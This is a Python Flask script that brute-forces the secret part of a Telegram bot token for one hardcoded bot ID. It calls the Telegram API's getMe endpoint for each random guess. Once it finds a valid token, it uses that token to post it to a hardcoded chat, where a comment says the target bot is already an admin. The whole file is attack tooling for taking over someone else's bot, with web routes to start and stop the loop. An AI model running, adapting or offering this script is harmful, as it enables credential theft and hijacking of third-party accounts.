from flask import Flask, jsonify
import requests
import threading
import random
import string
import time

app = Flask(__name__)

BOT_ID = "7717416180"
CHAT_ID = "-1002702356198"  # Group/Channel where the target bot is already admin

is_running = False
found_token = None

def random_token_part(length=35):
    chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(chars) for _ in range(length))

def check_token(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        r = requests.get(url, timeout=5)
        data = r.json()
        if data.get("ok"):
            return data["result"]["username"]
        else:
            return None
    except:
        return None

def notify_with_found_bot(token):
    text = f"✅ Found valid bot token:\n\n`{token}`"
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        r = requests.post(url, data=data, timeout=5)
        print("[+] Notification sent from recovered bot ✅")
    except Exception as e:
        print("[-] Could not notify from bot:", e)

def brute_force_loop():
    global is_running, found_token

    print("[*] Brute-force started...")
    while is_running and not found_token:
        token_part = random_token_part()
        token = f"{BOT_ID}:{token_part}"
        username = check_token(token)
        if username:
            print(f"[+] VALID TOKEN FOUND: {token} ({username})")
            found_token = token
            notify_with_found_bot(token)
            is_running = False
            break
        else:
            print(f"[-] Invalid: {token}")
        time.sleep(1)

@app.route('/')
def home():
    return {"status": "OK", "found_token": found_token}

@app.route('/start')
def start():
    global is_running
    if is_running:
        return {"status": "already_running"}
    is_running = True
    threading.Thread(target=brute_force_loop).start()
    return {"status": "started"}

@app.route('/stop')
def stop():
    global is_running
    is_running = False
    return {"status": "stopped"}

if __name__ == '__main__':
    app.run(debug=True, port=5000, host='0.0.0.0')
